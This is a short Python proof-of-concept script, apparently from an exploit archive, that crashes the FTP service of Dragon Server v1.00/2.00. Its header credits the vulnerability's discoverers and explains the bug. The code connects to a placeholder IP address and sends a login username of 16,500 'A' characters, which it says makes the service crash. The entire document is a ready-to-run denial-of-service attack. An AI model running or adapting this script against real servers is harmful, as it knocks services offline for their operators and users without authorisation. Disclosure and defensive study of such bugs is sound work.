                                                                      
#!/usr/bin/python                                                     
#                                                                     
# Dragon Server(ftp) DoS Proof of Concept Code.                       
# Vulnerability Discovered by USSR Labs(http://www.ussrback.com)      
# Simple Script by Prizm(Prizm@Resentment.org)                        
#                                                                     
# By connecting to port 21(ftp) on a system running Dragon FTP Server 
v1.00/2.00 and typing                                                 
# USER (16500 bytes) the service will crash                           
#                                                                     
# This *simple* little script will cause Dragon Server's ftp service  
to crash.                                                             
                                                                      
from ftplib import FTP                                                
                                                                      
ftp = FTP('xxx.xxx.xxx.xxx') # Replace x's with ip                    
ftp.login('A' * 16500)                                                
ftp.quit()                                                            
                                                                      
